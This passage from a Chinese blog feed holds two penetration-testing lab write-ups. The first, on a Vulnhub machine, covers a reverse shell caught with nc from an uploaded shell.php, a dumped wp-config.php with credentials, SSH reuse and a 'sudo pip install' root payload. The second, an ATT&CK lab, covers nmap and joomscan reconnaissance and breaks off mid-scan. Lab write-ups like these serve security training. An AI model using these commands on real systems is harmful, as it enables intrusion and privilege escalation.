alt="图片"></p><p>这个时候就通过<code>MITM</code>成功的获取到一枚shell！这里多亏队员 <code>Ironman_24</code> 大佬的提示！感谢！！！</p><h3 id="第二种方法"><a href="#第二种方法" class="headerlink" title="第二种方法"></a>第二种方法</h3><p>我在我 <code>MAC</code> 的 <code>WMware</code> 添加了一个新的网卡，<code>VMware2</code>，随后修改了一下 <code>KALI</code> 的 <code>静态IP</code> ：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/961.png" alt="图片"></p><p>设置完后重启网络：<code>/etc/init.d/networking restart</code> ，这个时候 <code>ip</code> 就更改成功了：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/962.png" alt="图片"></p><p>接着访问 <code>http://192.168.1.130/zhkh/wp-content/uploads/uigen_2019/shell.php</code> ,然后 <code>nc</code> 监听 <code>5555</code> 端口得到了一枚 shell：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/963.png" alt="图片"></p><p>看了看权限只是一个普通的网站权限：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/964.png" alt="图片"></p><p>我们先让它得到一个 <code>bash</code> 的 shell 把：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/965.png" alt="图片"></p><p>来到了网站根目录下找到了 <code>Wordpress</code> 的配置文件：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/966.png" alt="图片"></p><p>发现了 <code>Mysql</code> 的连接信息：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&lt;</span>?php</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The base configuration for WordPress</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The wp-config.php creation script uses this file during the</span></span><br><span class="line"><span class="comment"> * installation. You don&#x27;t have to use the web site, you can</span></span><br><span class="line"><span class="comment"> * copy this file to &quot;wp-config.php&quot; and fill in the values.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This file contains the following configurations:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * * MySQL settings</span></span><br><span class="line"><span class="comment"> * * Secret keys</span></span><br><span class="line"><span class="comment"> * * Database table prefix</span></span><br><span class="line"><span class="comment"> * * ABSPATH</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @link https://codex.wordpress.org/Editing_wp-config.php</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @package WordPress</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span> <span class="operator">*</span><span class="operator">*</span> MySQL settings <span class="operator">-</span> You can <span class="keyword">get</span> this info <span class="keyword">from</span> your web host <span class="operator">*</span><span class="operator">*</span> <span class="operator">/</span><span class="operator">/</span></span><br><span class="line"><span class="comment">/** The name of the database for WordPress */</span></span><br><span class="line"><span class="keyword">define</span>( <span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;wp_database&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL database username */</span></span><br><span class="line"><span class="keyword">define</span>( <span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;ra&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL database password */</span></span><br><span class="line"><span class="keyword">define</span>( <span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;912391929129&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** MySQL hostname */</span></span><br><span class="line"><span class="keyword">define</span>( <span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Database Charset to use in creating database tables. */</span></span><br><span class="line"><span class="keyword">define</span>( <span class="string">&#x27;DB_CHARSET&#x27;</span>, <span class="string">&#x27;utf8mb4&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/** The Database Collate type. Don&#x27;t change this if in doubt. */</span></span><br><span class="line"><span class="keyword">define</span>( <span class="string">&#x27;DB_COLLATE&#x27;</span>, <span class="string">&#x27;&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/**#@+</span></span><br><span class="line"><span class="comment"> * Authentication Unique Keys and Salts.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Change these to different unique phrases!</span></span><br><span class="line"><span class="comment"> * You can generate these using the &#123;@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service&#125;</span></span><br><span class="line"><span class="comment"> * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @since 2.6.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">define</span>( <span class="string">&#x27;AUTH_KEY&#x27;</span>,         <span class="string">&#x27;hmdNSrpLV5we) E$0_/E,$Vxr0%&lt;S&#123;]D@)T+rc%a7wvbr)Q|bm7boJdOz/AN&gt;/#&amp;&#x27;</span> );</span><br><span class="line"><span class="keyword">define</span>( <span class="string">&#x27;SECURE_AUTH_KEY&#x27;</span>,  <span class="string">&#x27;DR&amp;l3&gt;0z8mmFT+Y&#125;#bqND_~H;wb[r|:te+tN%:K PS7=~~/;uA5)zj~Z%tu&#125;-8UJ&#x27;</span> );</span><br><span class="line"><span class="keyword">define</span>( <span class="string">&#x27;LOGGED_IN_KEY&#x27;</span>,    <span class="string">&#x27;7+cns%lA?p60U~*(J,z9zp4w 2%hB1S6jZ0NuUgl(oK,#H6&amp;GL,i@+4m:1w3|-aW&#x27;</span> );</span><br><span class="line"><span class="keyword">define</span>( <span class="string">&#x27;NONCE_KEY&#x27;</span>,        <span class="string">&#x27;m5,d=I4 MShd4lU#8F@@oj2cKpc+J[Kp3bRt%Sfuw.%#`oVKzgDMTl5+D[nu,R&lt;K&#x27;</span> );</span><br><span class="line"><span class="keyword">define</span>( <span class="string">&#x27;AUTH_SALT&#x27;</span>,        <span class="string">&#x27;sl3w_.&#125;n|M&#123;~D#6,v]U?Kz/,k&amp;oCnn1._|(i3Y|ng7+&lt;-f4Nv7mmR4B&lt;i&gt;!?du#i&#x27;</span> );</span><br><span class="line"><span class="keyword">define</span>( <span class="string">&#x27;SECURE_AUTH_SALT&#x27;</span>, <span class="string">&#x27;b&gt;,[La8I5xqchTMvXN-bI8%[)-V[wHjNmj/1jZ_Vnq`q0&lt;|E@6^.8~KpI_#53Rw_&#x27;</span> );</span><br><span class="line"><span class="keyword">define</span>( <span class="string">&#x27;LOGGED_IN_SALT&#x27;</span>,   <span class="string">&#x27;v_`E=EA]$UBa.2P|%YV4cl&#125;(c@AVkW$V5959/gQL~a:,O&#125;qfG85Xc4)=xRBux6g?&#x27;</span> );</span><br><span class="line"><span class="keyword">define</span>( <span class="string">&#x27;NONCE_SALT&#x27;</span>,       <span class="string">&#x27;TE#Tim,4h|zKYm$he[F%J*4vG&#123;v]VK!jP0sSeBLHp7Mp|P*XJz:=&amp;n&lt;nsfbIFq&gt;a&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/**#@-*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * WordPress Database Table prefix.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * You can have multiple installations in one database if you give each</span></span><br><span class="line"><span class="comment"> * a unique prefix. Only numbers, letters, and underscores please!</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">$table_prefix <span class="operator">=</span> <span class="string">&#x27;wp_&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * For developers: WordPress debugging mode.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Change this to true to enable the display of notices during development.</span></span><br><span class="line"><span class="comment"> * It is strongly recommended that plugin and theme developers use WP_DEBUG</span></span><br><span class="line"><span class="comment"> * in their development environments.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * For information on other constants that can be used for debugging,</span></span><br><span class="line"><span class="comment"> * visit the Codex.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * @link https://codex.wordpress.org/Debugging_in_WordPress</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">define</span>( <span class="string">&#x27;WP_DEBUG&#x27;</span>, <span class="literal">false</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/* That&#x27;s all, stop editing! Happy publishing. */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/** Absolute path to the WordPress directory. */</span></span><br><span class="line">if ( <span class="operator">!</span> defined( <span class="string">&#x27;ABSPATH&#x27;</span> ) ) &#123;</span><br><span class="line">        <span class="keyword">define</span>( <span class="string">&#x27;ABSPATH&#x27;</span>, dirname( __FILE__ ) . <span class="string">&#x27;/&#x27;</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/** Sets up WordPress vars and included files. */</span></span><br><span class="line">require_once( ABSPATH . <span class="string">&#x27;wp-settings.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>`Db]f&#123;He3HgO`(z</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/967.png" alt="图片"></p><p>尝试登陆 <code>Mysql</code> 登陆成功，通过在数据库里查看管理员的账户密码发现密码是加密加盐了的：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [wp_database]<span class="operator">&gt;</span> <span class="keyword">show</span> tables;</span><br><span class="line"><span class="keyword">show</span> tables;</span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------+</span></span><br><span class="line"><span class="operator">|</span> Tables_in_wp_database <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------+</span></span><br><span class="line"><span class="operator">|</span> wp_commentmeta        <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> wp_comments           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> wp_links              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> wp_options            <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> wp_postmeta           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> wp_posts              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> wp_term_relationships <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> wp_term_taxonomy      <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> wp_termmeta           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> wp_terms              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> wp_usermeta           <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> wp_users              <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-----------------------+</span></span><br><span class="line"><span class="number">12</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.001</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [wp_database]<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> wp_users;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> wp_users;</span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------+------------------------------------+---------------+------------+----------+---------------------+---------------------+-------------+--------------+</span></span><br><span class="line"><span class="operator">|</span> ID <span class="operator">|</span> user_login <span class="operator">|</span> user_pass                          <span class="operator">|</span> user_nicename <span class="operator">|</span> user_email <span class="operator">|</span> user_url <span class="operator">|</span> user_registered     <span class="operator">|</span> user_activation_key <span class="operator">|</span> user_status <span class="operator">|</span> display_name <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------+------------------------------------+---------------+------------+----------+---------------------+---------------------+-------------+--------------+</span></span><br><span class="line"><span class="operator">|</span>  <span class="number">1</span> <span class="operator">|</span> admin      <span class="operator">|</span> $P$Bn5.YpTbLgCbD2Ji7QLutRiZpRHeAS0 <span class="operator">|</span> admin         <span class="operator">|</span> ra<span class="variable">@ra</span>.com  <span class="operator">|</span>          <span class="operator">|</span> <span class="number">2019</span><span class="number">-11</span><span class="number">-21</span> <span class="number">16</span>:<span class="number">48</span>:<span class="number">31</span> <span class="operator">|</span>                     <span class="operator">|</span>           <span class="number">0</span> <span class="operator">|</span> admin        <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">----+------------+------------------------------------+---------------+------------+----------+---------------------+---------------------+-------------+--------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.000</span> sec)</span><br><span class="line"></span><br><span class="line">MariaDB [wp_database]<span class="operator">&gt;</span> </span><br><span class="line"></span><br><span class="line">MariaDB [wp_database]<span class="operator">&gt;</span>   </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/968.png" alt="图片"></p><p>就在这个时候，我发现了一个注释引起了我的注意：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`Db]f&#123;He3HgO`(z</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/969.png" alt="图片"></p><p>抱着试一试的心态登陆 <code>sa</code> 用户的 <code>SSH</code> 发现登陆成功：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/970.png" alt="图片"></p><h2 id="pip提权拿到Flag"><a href="#pip提权拿到Flag" class="headerlink" title="pip提权拿到Flag"></a>pip提权拿到Flag</h2><p>通过查看那些命令是可以以 <code>root</code> 权限执行的发现了 <code>pip</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/971.png" alt="图片"></p><p>这个时候通过 <code>https://gtfobins.github.io/</code> 这个提权手册找到了现成的 Payload <code>https://gtfobins.github.io/gtfobins/pip/#sudo</code> ，利用 <code>sudo</code> 提权为 <code>root</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TF=$(mktemp -d)</span><br><span class="line">echo &quot;import os; os.execl(&#x27;/bin/sh&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;, &#x27;sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#x27;)&quot; &gt; $TF/setup.py</span><br><span class="line">sudo pip install $TF</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/972.png" alt="图片"></p><p>最终在 <code>/root</code> 目录下拿到 <code>flag</code>  ～</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这次靶机的相对于来说还是挺有新意的，接触了到<code>MITM</code>（中间人攻击）学会了这种思路就方便以后遇到就可以利用这种思路去解题。</p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> Vulnhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> 权限提升 </tag>
            
            <tag> CTF </tag>
            
            <tag> Vulnhub </tag>
            
            <tag> MITM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ATT&amp;CK-RedTeaming-实战入侵演练，横向渗透拿到Flag</title>
      <link href="/2019/12/29/ATTCK-Red-Teaming-1/"/>
      <url>/2019/12/29/ATTCK-Red-Teaming-1/</url>
      
        <content type="html"><![CDATA[<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=33875750&auto=1&height=66"></iframe><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>靶机作者：licong<br>靶机下载地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/5/">下载链接</a><br>靶机描述：域控中存在一份重要文件（获取域控权限）<br>靶机主机有5台：ubantu、win2008、win7、win2012、centos<br>攻击主机：KALI（192.168.93.128）、Win10（192.168.1.103）</p><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>因为我使用的网卡是新增的<code>VMnet2</code>（仅主机模式），IP段为<code>192.168.93.x</code>。所有探测靶场<code>IP</code>的时候就可以使用这个命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -i eth0 -r 192.168.93.1/24</span><br><span class="line">命令注释：-i 制定网卡，-r 指定IP段（扫描eth0网卡下的192.168.93.1的C段）</span><br></pre></td></tr></table></figure><p> <img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/876.png" alt="图片"></p><p>去除 <code>192.168.93.1</code> 和 <code>192.168.93.254</code> 这两个 <code>IP</code> ，剩下五个 <code>IP</code> 正好是这次靶机的 <code>IP</code> ！我们先通过 <code>NMAP</code> 对每个 <code>IP</code> 进行探测它的操作系统以及他们的端口开放服务，方便后面的一系列渗透测试：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -O 192.168.93.10</span><br><span class="line">注释：-sV 是让NMAP进行版本探测，-O 是探测操作系统</span><br></pre></td></tr></table></figure><p> <img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/877.png" alt="图片"></p><p> <code>192.168.93.10</code> 这个 <code>IP</code> 扫描出来后发现是 <code>Windows 2012</code> ！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -O 192.168.93.20</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/878.png" alt="图片"></p><p><code>192.168.93.20</code> 这个 <code>IP</code> 扫描出来后发现是 <code>Windows 2008</code>！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -O 192.168.93.30</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/879.png" alt="图片"></p><p><code>192.168.93.30</code> 这个 <code>IP</code> 扫描出来后发现是 <code>Windows 7</code>！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -O 192.168.93.100</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/880.png" alt="图片"></p><p><code>192.168.93.100</code> 这个 <code>IP</code> 扫描出来后发现是 <code>Linux</code>，但是无法确定是不是 <code>Ubantu</code>！</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -O 192.168.93.120</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/881.png" alt="图片"></p><p><code>192.168.93.120</code> 这个 <code>IP</code> 扫描出来后发现是 <code>Liunx</code>，通过探测端口开放信息得知它应该是 <code>Ubantu</code>，而上面的 <code>192.168.93.100</code> 那个估计就是 <code>Centos</code>了！</p><h2 id="攻击的拓扑图"><a href="#攻击的拓扑图" class="headerlink" title="攻击的拓扑图"></a>攻击的拓扑图</h2><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/882.png" alt="图片"></p><p>其中 <code>KALI</code> 的 <code>IP</code> 会在文章中有变动，因为我搞这把靶场的时候中途关机过几次，随着开启启动<code>VMware</code>后<code>DHCP</code>会自动给它分配一个新的<code>IP</code>，所以我的 <code>KALI</code> 在文章中变成了 <code>192.168.1.128</code>、<code>192.168.1.129</code>、<code>192.168.1.130</code>！</p><p>（小弟第一次做拓扑图，就这样吧…）</p><h2 id="JoomlaCMS深入探测"><a href="#JoomlaCMS深入探测" class="headerlink" title="JoomlaCMS深入探测"></a>JoomlaCMS深入探测</h2><p>通过开放了 <code>http</code> 服务，我首先来看看 <code>192.168.93.20</code> 的 <code>web</code>，先是枚举了一下页面：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/883.png" alt="图片"></p><p>发现有一个 <code>401</code> 登陆认证的页面：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.93.20/reports</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/884.png" alt="图片"></p><p>经过一系列的 admin:admin、admin:admin123 … 等等<code>弱口令</code>尝试后果断放弃！通过搜索了一下 <code>Windows 2008</code> 相关的漏洞发现有一个<code>永恒之蓝</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/885.png" alt="图片"></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/886.png" alt="图片"></p><p>但是没啥用，这个先暂时缓缓，总不能在一棵树上吊死吧！</p><p>来到下一个 IP : <code>192.168.93.30</code> ! 继续我们的<code>永恒之蓝</code>看看能不能打下来：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/887.png" alt="图片"></p><p>看了没用啊，靶机还是有点”困难”的啊，原本以为这靶机存在永恒之蓝就可以打下了，事不如愿呐。</p><p>继续下一个 IP ：<code>192.168.93.100</code>！通过再次的端口扫描所有详细信息后得知：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/888.png" alt="图片"></p><p>它开放了 <code>22</code>（ssh）,<code>80</code>（http）,<code>3306</code>（mysql），其中它 <code>80</code> 端口的 <code>web</code> 所使用的 <code>CMS</code> 为 <code>Joomla</code>！<code>JoomlaCMS</code>它是一套全球通用的CMS，所使用的脚本语言通常是 <code>PHP</code>。</p><p>访问 <code>http://192.168.93.100</code> 发现页面上没有什么可以利用点：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/889.png" alt="图片"></p><p>通过使用 <code>Joomscan</code> 这款工具对它进行了一系列扫描：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/rezasp/joomscan</span><br></pre></td></tr></table></figure><p>扫描结果如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">root@liuwx:~/hacker/joomscan-master<span class="comment"># perl joomscan.pl -u http://192.168.93.100/</span></span><br><span class="line"></span><br><span class="line">   ____  _____  _____  __  __  ___   ___    __    _  _ </span><br><span class="line">   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )</span><br><span class="line">  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  ( </span><br><span class="line">  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)</span><br><span class="line">(1337.today)</span><br><span class="line">   </span><br><span class="line">    --=[OWASP JoomScan</span><br><span class="line">    +---++---==[Version : 0.0.7</span><br><span class="line">    +---++---==[Update Date : [2018/09/23]</span><br><span class="line">    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo</span><br><span class="line">    --=[Code name : Self Challenge</span><br><span class="line">    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP</span><br><span class="line"></span><br><span class="line">Processing http://192.168.93.100/ ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] FireWall Detector</span><br><span class="line">[++] Firewall not detected</span><br><span class="line"></span><br><span class="line">[+] Detecting Joomla Version</span><br><span class="line">[++] Joomla 3.9.12</span><br><span class="line"></span><br><span class="line">[+] Core Joomla Vulnerability</span><br><span class="line">[++] Target Joomla core is not vulnerable</span><br><span class="line"></span><br><span class="line">[+] Checking Directory Listing</span><br><span class="line">[++] directory has directory listing : </span><br><span class="line">http://192.168.93.100/administrator/components</span><br><span class="line">http://192.168.93.100/administrator/modules</span><br><span class="line">http://192.168.93.100/administrator/templates</span><br><span class="line">http://192.168.93.100/images/banners</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Checking apache info/status files</span><br><span class="line">[++] Readable info/status files are not found</span><br><span class="line"></span><br><span class="line">[+] admin finder</span><br><span class="line">[++] Admin page : http://192.168.93.100/administrator/</span><br><span class="line"></span><br><span class="line">[+] Checking robots.txt existing</span><br><span class="line">[++] robots.txt is found</span><br><span class="line">path : http://192.168.93.100/robots.txt </span><br><span 